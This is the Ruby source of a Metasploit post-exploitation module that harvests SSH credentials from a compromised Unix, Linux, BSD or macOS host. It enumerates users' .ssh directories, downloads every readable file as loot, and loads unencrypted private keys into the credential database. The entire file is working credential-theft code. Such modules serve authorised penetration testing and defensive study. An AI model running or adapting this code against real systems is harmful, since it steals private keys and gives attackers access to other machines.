##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'sshkey'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info={})
    super( update_info(info,
      'Name'           => 'Multi Gather OpenSSH PKI Credentials Collection',
      'Description'    => %q{
          This module will collect the contents of all users' .ssh directories on the targeted
        machine. Additionally, known_hosts and authorized_keys and any other files are also
        downloaded. This module is largely based on firefox_creds.rb.
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['Jim Halfpenny'],
      'Platform'       => %w{ bsd linux osx unix },
      'SessionTypes'   => ['meterpreter', 'shell' ]
    ))
  end

  def run
    print_status("Finding .ssh directories")
    paths = enum_user_directories.map {|d| d + "/.ssh"}
    # Array#select! is only in 1.9
    paths = paths.select { |d| directory?(d) }

    if paths.nil? or paths.empty?
      print_error("No users found with a .ssh directory")
      return
    end

    print_status("Looting #{paths.count} .ssh directories")
    download_loot(paths)
  end

  def download_loot(paths)
    paths.each do |path|
      path.chomp!
      print_status("Looting #{path} directory")
      unless executable?(path)
        print_warning("Can not access the directory. Missing execute bit. Skipping.")
        next
      end

      if session.type == "meterpreter"
        sep = session.fs.file.separator
        files = session.fs.dir.entries(path)
      else
        # Guess, but it's probably right
        sep = "/"
        files = cmd_exec("ls -1 #{path}").split(/\r\n|\r|\n/)
      end
      path_array = path.split(sep)
      path_array.pop
      user = path_array.pop
      files.each do |file|
        next if [".", ".."].include?(file)
        unless readable?(path + sep + file)
          print_warning("Can not read file: #{path}#{sep}#{file} . Missing read permission. Skipping.")
          next
        end

        data = read_file("#{path}#{sep}#{file}")
        file = file.split(sep).last

        loot_path = store_loot("ssh.#{file}", "text/plain", session, data, "ssh_#{file}", "OpenSSH #{file} File")
        print_good("Downloaded #{path}#{sep}#{file} -> #{loot_path}")

        # store only ssh private keys
        unless SSHKey.valid_ssh_public_key? data
          begin
            key = SSHKey.new(data, :passphrase => "")

            credential_data = {
              origin_type: :session,
              session_id: session_db_id,
              post_reference_name: self.refname,
              private_type: :ssh_key,
              private_data: key.key_object.to_s,
              username: user,
              workspace_id: myworkspace_id
            }

            create_credential(credential_data)
          rescue OpenSSL::OpenSSLError => e
            print_error("Could not load SSH Key: #{e.message}")
          end
        end

      end

    end
  end
end
